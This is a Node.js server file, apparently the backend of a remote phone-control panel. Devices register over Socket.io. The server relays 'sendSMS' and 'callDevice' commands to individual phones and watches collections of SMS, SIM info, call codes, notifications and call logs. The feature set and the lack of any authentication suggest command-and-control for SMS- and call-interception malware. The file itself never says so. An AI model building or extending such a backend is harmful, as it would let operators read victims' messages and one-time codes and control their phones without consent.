import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import { createServer } from "http";
import { Server } from "socket.io";
import fetch from "node-fetch";
import mongoose from "mongoose";
import { connectDB } from "./config/db.js";

// ROUTES
import deviceRoutes from "./routes/deviceRoutes.js";
import smsRoutes from "./routes/smsRoutes.js";
import simInfoRoutes from "./routes/simInfoRoutes.js";
import notificationRoutes from "./routes/notificationRoutes.js";
import callRoutes from "./routes/callRoutes.js";
import adminRoutes from "./routes/adminRoutes.js";
import serialRoutes from "./routes/serialRoutes.js";
import callLogRoutes from "./routes/callLogRoutes.js";
import statusRoutes from "./routes/statusRoutes.js";
import lastSeenRoutes from "./routes/lastSeen.routes.js";

dotenv.config();
connectDB();

const app = express();
const server = createServer(app);

// → Long timeout fix
const io = new Server(server, {
  cors: { origin: "*", methods: ["GET", "POST"] },
  pingInterval: 25000,
  pingTimeout: 60000,
  connectTimeout: 60000,
});

app.use(cors());
app.use(express.json());
app.set("io", io);

const deviceSockets = new Map();

// ================================================
// SOCKET HANDLER
// ================================================
io.on("connection", (socket) => {

  let currentDeviceId = null;

  // ============================
  // REGISTER DEVICE
  // ============================
  socket.on("registerDevice", (uniqueid) => {
    if (!uniqueid) return;

    currentDeviceId = uniqueid;
    console.log(`🟢 DEVICE CONNECTED: ${uniqueid}`);

    if (deviceSockets.has(uniqueid)) {
      const oldSocketId = deviceSockets.get(uniqueid);
      if (oldSocketId !== socket.id) {
        console.log(`♻️ Updating socket for ${uniqueid}`);
      }
    }

    deviceSockets.set(uniqueid, socket.id);
    socket.join(uniqueid);

    saveLastSeen(uniqueid, "Online");

    io.to(socket.id).emit("deviceRegistered", { uniqueid });

    io.emit("deviceListUpdated", {
      event: "device_connected",
      uniqueid,
    });
  });

  // ============================
  // DEVICE STATUS
  // ============================
  socket.on("deviceStatus", (data) => {
    const { uniqueid, connectivity } = data || {};
    if (!uniqueid) return;

    console.log(`⚡ ${uniqueid} → ${connectivity}`);

    saveLastSeen(uniqueid, connectivity);

    io.emit("deviceStatus", {
      uniqueid,
      connectivity,
      updatedAt: new Date(),
    });
  });

  // ============================
  // SMS SEND REQUEST
  // ============================
  socket.on("sendSMS", (payload) => {
    if (!payload?.deviceId) return;

    const socketId = deviceSockets.get(payload.deviceId);

    if (socketId) {
      console.log(`📨 Sending SMS command to device: ${payload.deviceId}`);
      io.to(socketId).emit("smsCommand", payload);
    } else {
      console.log(`⚠️ Device offline for SMS: ${payload.deviceId}`);
    }
  });

  // ============================
  // CALL COMMAND
  // ============================
  socket.on("callDevice", (payload) => {
    const socketId = deviceSockets.get(payload.deviceId);

    if (socketId) {
      console.log(`📞 Call command → ${payload.deviceId}`);
      io.to(socketId).emit("callCommand", payload);
    }
  });

  // ============================
  // DISCONNECT
  // ============================
  socket.on("disconnect", () => {
    if (!currentDeviceId) return;

    console.log(`🔴 DISCONNECTED: ${currentDeviceId}`);

    setTimeout(() => {
      const still = deviceSockets.get(currentDeviceId);

      if (!still || still !== socket.id) return;

      deviceSockets.delete(currentDeviceId);

      console.log(`📵 OFFLINE: ${currentDeviceId}`);
      saveLastSeen(currentDeviceId, "Offline");

      io.emit("deviceStatus", {
        uniqueid: currentDeviceId,
        connectivity: "Offline",
      });
    }, 3000);
  });
});

// ================================================
// HELPERS
// ================================================
async function saveLastSeen(deviceId, connectivity) {
  try {
    const PORT = process.env.PORT || 5000;

    await fetch(`http://localhost:${PORT}/api/lastseen/${deviceId}/status`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ connectivity }),
    });
  } catch (err) {
    console.error("❌ lastSeen error:", err.message);
  }
}

// ================================================
// DB WATCHERS
// ================================================
mongoose.connection.once("open", () => {
  console.log("📡 Watching MongoDB Collections");

  // WATCH SMS
  mongoose.connection
    .collection("sms")
    .watch()
    .on("change", async (chg) => {
      if (!["insert", "update"].includes(chg.operationType)) return;

      const sms = await mongoose.connection
        .collection("sms")
        .findOne({ _id: chg.documentKey._id });

      const socketId = deviceSockets.get(sms.deviceId);
      if (socketId) {
        console.log("📩 New SMS → sending to device", sms.deviceId);
        io.to(socketId).emit("smsUpdate", sms);
      }
    });

  // WATCH CALLCODES
  mongoose.connection
    .collection("callcodes")
    .watch()
    .on("change", async (chg) => {
      if (!["insert", "update"].includes(chg.operationType)) return;

      const updated = await mongoose.connection
        .collection("callcodes")
        .findOne({ _id: chg.documentKey._id });

      const socketId = deviceSockets.get(updated.deviceId);
      if (socketId) {
        console.log("📞 CallCode Update →", updated.deviceId);
        io.to(socketId).emit("callCodeUpdate", updated);
      }
    });

  // WATCH SIMINFO
  mongoose.connection
    .collection("siminfos")
    .watch()
    .on("change", async (chg) => {
      const updated = await mongoose.connection
        .collection("siminfos")
        .findOne({ _id: chg.documentKey._id });

      io.emit("simInfoUpdated", updated);
    });

  // WATCH DEVICES
  mongoose.connection
    .collection("devices")
    .watch()
    .on("change", async (chg) => {
      const updated = await mongoose.connection
        .collection("devices")
        .findOne({ _id: chg.documentKey._id });

      io.emit("deviceListUpdated", {
        event: "db_change",
        device: updated,
      });
    });
});

app.get("/", (req, res) => res.send("Server Running"));

app.use("/api/device", deviceRoutes);
app.use("/api/sms", smsRoutes);
app.use("/api/siminfo", simInfoRoutes);
app.use("/api/notification", notificationRoutes);
app.use("/api/call", callRoutes);
app.use("/api/admin", adminRoutes);
app.use("/api/serial", serialRoutes);
app.use("/api/status", statusRoutes);
app.use("/api/lastseen", lastSeenRoutes);
app.use("/api/call-log", callLogRoutes);

const PORT = process.env.PORT || 5000;
server.listen(PORT, () => {
  console.log(`✨ SERVER LIVE → http://localhost:${PORT}`);
});
